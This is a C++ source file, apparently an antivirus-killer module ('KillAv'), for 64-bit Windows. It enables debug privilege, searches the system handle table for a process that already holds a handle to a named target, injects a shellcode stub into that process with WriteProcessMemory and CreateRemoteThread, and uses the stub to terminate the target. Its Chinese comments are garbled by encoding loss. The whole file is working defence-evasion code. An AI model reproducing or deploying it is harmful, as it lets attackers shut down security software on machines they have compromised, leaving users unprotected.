
#ifdef _WIN64
#ifndef _DEBUG
#include "stdafx.h"
#include "KillAv.h"
#include <string>
#include <vector>
#include <fstream>
#include <iostream>

#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <Psapi.h>



typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG ProcessId;//���̱�ʶ�� 
	UCHAR ObjectTypeNumber;//�򿪵Ķ��������
	UCHAR Flags;//������Ա�־
	USHORT Handle;//�����ֵ,�ڽ��̴򿪵ľ����Ψһ��ʶĳ�����
	PVOID Object;//������Ǿ����Ӧ��EPROCESS�ĵ�ַ
	ACCESS_MASK GrantedAccess;//�������ķ���Ȩ��
}SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;
typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_INFORMATION Information[655360];
}SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;

typedef BOOL(WINAPI* pTerminateProcess)(HANDLE, UINT);
typedef HANDLE(WINAPI* pOpenProcess)(DWORD, BOOL, DWORD);
typedef NTSTATUS(WINAPI* fn_ZwQueryObject)(HANDLE, int, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* fn_ZwQueryInformationProcess)(HANDLE, int, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* fn_ZwQuerySystemInformation)(int, PVOID, ULONG, PULONG);

fn_ZwQueryInformationProcess pfn_ZwQueryInformationProcess;
fn_ZwQueryObject pfn_ZwQueryObject;
fn_ZwQuerySystemInformation pfn_ZwQuerySystemInformation;
UINT g_ProcessID;
DWORD g_MainMoudle, g_SizeOfImage;
typedef struct _SHELLCODE
{
	HANDLE fnHandle;
	DWORD fnPID;
	pTerminateProcess fnTerminateProcess;
	pOpenProcess fnOpenProcess;
}SHELLCODE, * PSHELLCODE;
DWORD WINAPI InjectShellCode(PVOID p)
{
	PSHELLCODE shellcode = (PSHELLCODE)p;
	//���ڻ���û��TerminateȨ��,����ʹ�÷���2
	//shellcode->fnTerminateProcess(shellcode->fnHandle,0);
	HANDLE hProcess = shellcode->fnOpenProcess(0x001FFFFF, 0, shellcode->fnPID);
	shellcode->fnTerminateProcess(hProcess, 0);
	return TRUE;
}
DWORD WINAPI InjectShellCodeEnd()
{
	return 0;
}


bool DoShellCodeInject(HANDLE handle, HANDLE TarHandle)
{
	bool success = false;
	LPVOID addrss_shellcode = VirtualAllocEx(handle, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (addrss_shellcode)
	{
		//����shellcode
		SHELLCODE ManualInject;
		memset(&ManualInject, 0, sizeof(SHELLCODE));
		ManualInject.fnTerminateProcess = TerminateProcess;
		ManualInject.fnHandle = TarHandle;
		ManualInject.fnPID = g_ProcessID;
		ManualInject.fnOpenProcess = OpenProcess;
	//	std::cout << "TarHandle 0x" << std::hex << TarHandle << std::endl;
		//дshellcode��Ŀ�����
		if (WriteProcessMemory(handle, addrss_shellcode, &ManualInject, sizeof(SHELLCODE), NULL) &&
			WriteProcessMemory(handle, (PVOID)((PSHELLCODE)addrss_shellcode + 1), InjectShellCode, (DWORD)InjectShellCodeEnd - (DWORD)InjectShellCode, NULL))
		{
			HANDLE hThread = CreateRemoteThread(handle, NULL, 0, (LPTHREAD_START_ROUTINE)((PSHELLCODE)addrss_shellcode + 1), addrss_shellcode, 0, NULL);
			if (hThread)
			{
				WaitForSingleObject(hThread, INFINITE);
			//	std::cout << "injected " << std::dec << GetProcessId(handle) << " AT:" << std::hex << addrss_shellcode << " Status " << GetLastError() << std::endl;
				success = true;
			}
		}
		else
		{
		//	std::cout << "WriteProcessMemory ʧ�� " << GetLastError() << std::endl;
		}
		VirtualFreeEx(handle, addrss_shellcode, 0, MEM_RELEASE);
	}
	else
	{
		//std::cout << "VirtualAllocEx ʧ�� " << GetLastError() << std::endl;
	}
	return success;
}
bool InitFunction()
{
	HMODULE NtDll = GetModuleHandleA("ntdll.dll");
	pfn_ZwQueryInformationProcess = NtDll ? (fn_ZwQueryInformationProcess)GetProcAddress(NtDll, "ZwQueryInformationProcess") : nullptr;
	pfn_ZwQueryObject = NtDll ? (fn_ZwQueryInformationProcess)GetProcAddress(NtDll, "ZwQueryObject") : nullptr;
	pfn_ZwQuerySystemInformation = NtDll ? (fn_ZwQuerySystemInformation)GetProcAddress(NtDll, "ZwQuerySystemInformation") : nullptr;
	return pfn_ZwQueryInformationProcess != nullptr && pfn_ZwQueryObject != nullptr && pfn_ZwQuerySystemInformation != nullptr;
}


bool ProcessName2Pid(TCHAR*  ProcessName)
{
	bool FoundPID = false;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		std::cout << "CreateToolhelp32Snapshot Error!" << std::endl;;
		return false;
	}
	BOOL bResult = Process32First(hProcessSnap, &pe32);
	while (bResult)
	{
		if (wcscmp(pe32.szExeFile, ProcessName) == 0)
		{
			FoundPID = true;
			g_ProcessID = pe32.th32ProcessID;
			break;
		}
		bResult = Process32Next(hProcessSnap, &pe32);
	}
	CloseHandle(hProcessSnap);
	return FoundPID;
}


PSYSTEM_HANDLE_INFORMATION_EX QueryHandleTable()
{
	ULONG cbBuffer = sizeof(SYSTEM_HANDLE_INFORMATION_EX);
	LPVOID pBuffer = (LPVOID)malloc(cbBuffer);
	PSYSTEM_HANDLE_INFORMATION_EX HandleInfo = nullptr;
	if (pBuffer)
	{
		pfn_ZwQuerySystemInformation(0x10, pBuffer, cbBuffer, NULL);
		HandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)pBuffer;
	}
	return HandleInfo;
}
DWORD64 GetTarEPROCESS()
{
	HANDLE TarHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, g_ProcessID);
	PSYSTEM_HANDLE_INFORMATION_EX HandleInfo = QueryHandleTable();
	DWORD64 EPROCESS;
	for (ULONG i = 0; i < HandleInfo->NumberOfHandles; i++)
	{
		if (HandleInfo->Information[i].Handle == (USHORT)TarHandle && HandleInfo->Information[i].ProcessId == GetCurrentProcessId())
		{
			EPROCESS = (DWORD64)HandleInfo->Information[i].Object;
			break;
		}
	}
	free(HandleInfo);
	CloseHandle(TarHandle);
	return EPROCESS;
}
bool FuckUpProcess()
{
	bool Found = false;
	DWORD64 TarEPROCESS = GetTarEPROCESS();
	if (!TarEPROCESS)
	{
		//std::cout << "�Ҳ���EPROCESS" << std::endl;
		return Found;
	}
	PSYSTEM_HANDLE_INFORMATION_EX HandleInfo = QueryHandleTable();
	for (ULONG i = 0; i < HandleInfo->NumberOfHandles; i++)
	{
		//7 �� process ����
		if (HandleInfo->Information[i].ObjectTypeNumber == 7)
		{
			if ((DWORD64)HandleInfo->Information[i].Object != TarEPROCESS)
				continue;
			//�ų���Ŀ����̵�PID
			if (HandleInfo->Information[i].ProcessId == g_ProcessID)
				continue;
			if ((HandleInfo->Information[i].GrantedAccess & PROCESS_VM_READ) != PROCESS_VM_READ)
				continue;
			if ((HandleInfo->Information[i].GrantedAccess & PROCESS_VM_OPERATION) != PROCESS_VM_OPERATION)
				continue;
			if ((HandleInfo->Information[i].GrantedAccess & PROCESS_QUERY_INFORMATION) != PROCESS_QUERY_INFORMATION)
				continue;
			//���ڻ����Ҳ�������TERMINATE��Ȩ��,ֻ���÷���2 ����PCHUNTERȴ����
			//if ((HandleInfo->Information[i].GrantedAccess & PROCESS_TERMINATE) != PROCESS_TERMINATE)
			//	continue;
			//ִ��shellcodeӳ�����
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, HandleInfo->Information[i].ProcessId);
			if (!hProcess || hProcess == INVALID_HANDLE_VALUE)
				continue;
			//std::cout << "�� " << HandleInfo->Information[i].ProcessId << " ���ҵ���һ�����ʾ��! HANDLE Ϊ: 0x" << std::hex << HandleInfo->Information[i].Handle << std::endl;
			if (!DoShellCodeInject(hProcess, (HANDLE)HandleInfo->Information[i].Handle))
				continue;
			Found = true;
			break;
		}
	}
	free(HandleInfo);
	return Found;
}

BOOL EnableDebugPrivilege(BOOL bEnable)
{
	BOOL fOK = FALSE;
	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) //�򿪽��̷�������
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		fOK = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return fOK;
}

void FuckOffProcessByName(TCHAR* name)
{
	if (InitFunction() && EnableDebugPrivilege(TRUE))
	{
		if (ProcessName2Pid(name))
		{
			FuckUpProcess();
		}
	}

}

#endif
#endif